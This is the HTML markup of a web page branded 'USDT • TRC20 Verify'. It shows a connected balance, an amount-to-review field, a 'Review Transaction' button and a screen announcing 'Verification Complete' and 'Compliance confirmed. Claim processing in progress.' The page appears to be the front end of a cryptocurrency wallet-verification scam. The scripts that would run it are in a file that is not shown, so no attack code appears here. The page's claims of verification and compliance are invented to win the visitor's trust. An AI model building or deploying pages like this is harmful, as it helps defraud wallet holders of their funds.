<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT • TRC20 Review Transaction 2026</title>
  <link rel="stylesheet" href="style.css">
  <script type="module" src="main.js" defer></script>
</head>
<body>
  <div class="app">
    <div class="topbar">
      <div class="logo">
        <div class="logo-mark">USDT</div>
        <div class="logo-wordmark">TRC20 Verify</div>
      </div>
    </div>

    <div class="balance-card">
      <div class="bal-label">Connected Balance</div>
      <div class="bal-amount" id="balDisplay">0.00 USDT</div>
    </div>

    <div class="actions">
      <div class="input-group">
        <label for="amount">Amount to review</label>
        <input type="number" id="amount" placeholder="Enter amount" value="1000" min="1" step="0.01">
      </div>
    </div>

    <button id="reviewBtn" class="cta">Review Transaction</button>

    <div id="status" class="spinner-overlay">
      <div class="spinner"></div>
      <div class="spinner-txt">Processing verification... Standby ♡</div>
    </div>

    <div id="successScreen" class="success-screen">
      <div class="s-ring">
        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#36C98E" stroke-width="3">
          <polyline points="20 6 9 17 4 12"></polyline>
        </svg>
      </div>
      <div class="s-title">Verification Complete</div>
      <div class="s-sub">Compliance confirmed. Claim processing in progress.</div>
      <div class="tx-box">
        <div class="tx-box-lbl">Transaction Hash</div>
        <div class="tx-hash-val" id="txHash">Pending...</div>
      </div>
    </div>
  </div>
</body>
</html>
